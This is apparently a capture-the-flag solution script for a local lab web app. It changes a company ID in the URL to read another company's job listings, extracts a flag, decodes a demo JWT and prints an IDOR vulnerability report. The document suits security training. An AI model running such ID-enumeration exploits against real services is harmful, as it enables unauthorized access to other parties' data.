import requests
import json
import re
import base64

base_url = "http://127.0.0.1:5000"
session = requests.Session()

print("IDOR VULNERABILITY ANALYSIS REPORT")
print("=" * 80)

print("\n[1] DISCOVERED ENDPOINTS ANALYSIS")
print("-" * 80)

endpoint1 = f"{base_url}/company/1/jobs"
endpoint2 = f"{base_url}/company/2/jobs"
token_endpoint = f"{base_url}/token"

print(f"\nEndpoint: GET {endpoint1}")
r1 = session.get(endpoint1)
print(f"Status: {r1.status_code}")
print(f"Response: {r1.text}")

print(f"\nEndpoint: GET {endpoint2}")
r2 = session.get(endpoint2)
print(f"Status: {r2.status_code}")
print(f"Response: {r2.text}")

flags = re.findall(r'FLAG\{[^}]+\}', r2.text)
if flags:
    print(f"\n[!] FLAG CAPTURED: {flags[0]}")

print(f"\nEndpoint: POST {token_endpoint}")
r3 = session.post(token_endpoint, data="username=demo&password=demo", headers={"Content-Type": "application/x-www-form-urlencoded"})
print(f"Status: {r3.status_code}")
print(f"Set-Cookie: {r3.headers.get('set-cookie', 'N/A')}")
print(f"Response: {r3.text}")

print("\n" + "=" * 80)
print("[2] AUTHENTICATION MECHANISM")
print("=" * 80)

token = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkZW1vIiwiZXhwIjoxNzY3MjQzODc4fQ.weTygG9dyY_DPi_6NUCOWWPLKnPyb_fERr7IxzbYKD0"
print(f"\nJWT Token: {token}")
parts = token.split('.')
header = json.loads(base64.b64decode(parts[0] + '=' * (4 - len(parts[0]) % 4)))
payload = json.loads(base64.b64decode(parts[1] + '=' * (4 - len(parts[1]) % 4)))
print(f"Header: {header}")
print(f"Payload: {payload}")

unauth = requests.Session()
r_unauth = unauth.get(endpoint2)
print(f"\nAccess without auth: Status {r_unauth.status_code}")
print("Authentication NOT required for job endpoints")

print("\n" + "=" * 80)
print("[3] ROUTE PATTERN")
print("=" * 80)

print("\nPattern: /company/{id}/jobs")
print("Parameter: {id} (numeric, sequential)")
print("Authorization: NONE")
print("Authentication: NOT ENFORCED")

print("\n" + "=" * 80)
print("[4] IDOR VULNERABILITY ANALYSIS")
print("=" * 80)

print("\n[Severity]: HIGH")
print("[Type]: Insecure Direct Object Reference (IDOR)")
print("[CWE]: CWE-639")
print("[OWASP]: A01:2021 - Broken Access Control")
print("\n[Description]: No authorization checks on resource access")
print("[Exploitation]: Change company ID parameter to access any company's data")
print("[Impact]: Unauthorized access to all company job listings")

print("\n" + "=" * 80)
print("[5] FLAG CAPTURED")
print("=" * 80)

if flags:
    print(f"\nFlag: {flags[0]}")
    print("Location: /company/2/jobs")
    print("Access: Unauthorized (no authentication required)")
    print("Protection Status: COMPROMISED")

print("\n" + "=" * 80)
print("ANALYSIS COMPLETE")
print("=" * 80)
